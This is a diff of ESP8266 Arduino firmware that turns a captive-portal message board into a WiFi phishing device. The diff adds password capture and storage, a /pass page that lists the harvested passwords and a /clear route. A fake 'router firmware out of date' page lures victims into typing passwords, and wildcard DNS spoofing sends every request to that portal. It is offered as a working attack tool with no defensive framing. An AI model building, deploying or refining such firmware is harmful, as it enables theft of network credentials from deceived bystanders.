@@ -1,7 +1,7 @@
 // ESP8266 WiFi Captive Portal
 // Based on: PopupChat https://github.com/tlack/popup-chat
 // Based on: Captive Portal by: M. Ray Burnette 20150831
-// Based on: https://github.com/tomhiggins/MsgDrop
+// Based on: https://github.com/tomhiggins/passDrop
 // Modded by BlueArduino20
 
 // Includes
@@ -16,17 +16,18 @@
 #define BODY "Your router firmware is out of date. Update your firmware to continue browsing normally."
 #define POST_TITLE "Updating..."
 #define POST_BODY "Your router is being updated. Please, wait until the proccess finishes.</br>Thank you."
-#define PASS_TITLE "Passwords:"
+#define PASS_TITLE "Passwords"
+#define CLEAR_TITLE "Cleared"
 
 // Init System Settings
-const byte HTTP_CODE = 200; // nyi? 511; // rfc6585
-const byte DNS_PORT = 53;  // Capture DNS requests on port 53
+const byte HTTP_CODE = 200;
+const byte DNS_PORT = 53;
 const byte TICK_TIMER = 1000;
-IPAddress APIP(10, 10, 10, 1);    // Private network for server
+IPAddress APIP(10, 10, 10, 1); // Gateway
 
-String allMsgs="";
-unsigned long bootTime=0, lastActivity=0, lastTick=0, tickCtr=0; // timers
-DNSServer dnsServer; ESP8266WebServer webServer(80); // standard api servers
+String allPass="";
+unsigned long bootTime=0, lastActivity=0, lastTick=0, tickCtr=0;
+DNSServer dnsServer; ESP8266WebServer webServer(80);
 
 String input(String argName) {
   String a=webServer.arg(argName);
@@ -56,7 +57,7 @@ String header(String t) {
   return h; }
 
 String pass() {
-  return header(PASS_TITLE) + "<ol>"+allMsgs+"</ol><br><a href=/>Back to Index</a>" + footer();
+  return header(PASS_TITLE) + "<ol>"+allPass+"</ol><br><center><p><a style=\"color:blue\" href=/>Back to Index</a></p><p><a style=\"color:blue\" href=/clear>Clear passwords</a></p></center>" + footer();
 }
 
 String index() {
@@ -65,17 +66,22 @@ String index() {
 }
 
 String posted() {
-  String msg=input("m"); allMsgs="<li><b>"+msg+"</b></li>"+allMsgs;
+  String pass=input("m"); allPass="<li><b>"+pass+"</b></li>"+allPass;
   return header(POST_TITLE) + POST_BODY + footer();
+}
+
+String clear() {
+  String pass="<p></p>"; allPass="<p></p>";
+  return header(CLEAR_TITLE) + "<div><p>The password list has been reseted.</div></p><center><a style=\"color:blue\" href=/>Back to Index</a></center>" + footer();
 }
 
 void BLINK() { // The internal LED will blink 5 times.
   int count = 0;
   while(count < 5){
     digitalWrite(BUILTIN_LED, LOW);
-    delay(350);
+    delay(500);
     digitalWrite(BUILTIN_LED, HIGH);
-    delay(350);
+    delay(500);
     count = count + 1;
   }
 }
@@ -86,9 +92,10 @@ void setup() {
   WiFi.mode(WIFI_AP);
   WiFi.softAPConfig(APIP, APIP, IPAddress(255, 255, 255, 0));
   WiFi.softAP(SSID_NAME);
-  dnsServer.start(DNS_PORT, "*", APIP);
+  dnsServer.start(DNS_PORT, "*", APIP); // DNS spoofing (Only HTTP)
   webServer.on("/post",[]() { webServer.send(HTTP_CODE, "text/html", posted()); BLINK(); });
   webServer.on("/pass",[]() { webServer.send(HTTP_CODE, "text/html", pass()); });
+  webServer.on("/clear",[]() { webServer.send(HTTP_CODE, "text/html", clear()); });
   webServer.onNotFound([]() { lastActivity=millis(); webServer.send(HTTP_CODE, "text/html", index()); });
   webServer.begin();
   pinMode(BUILTIN_LED, OUTPUT);
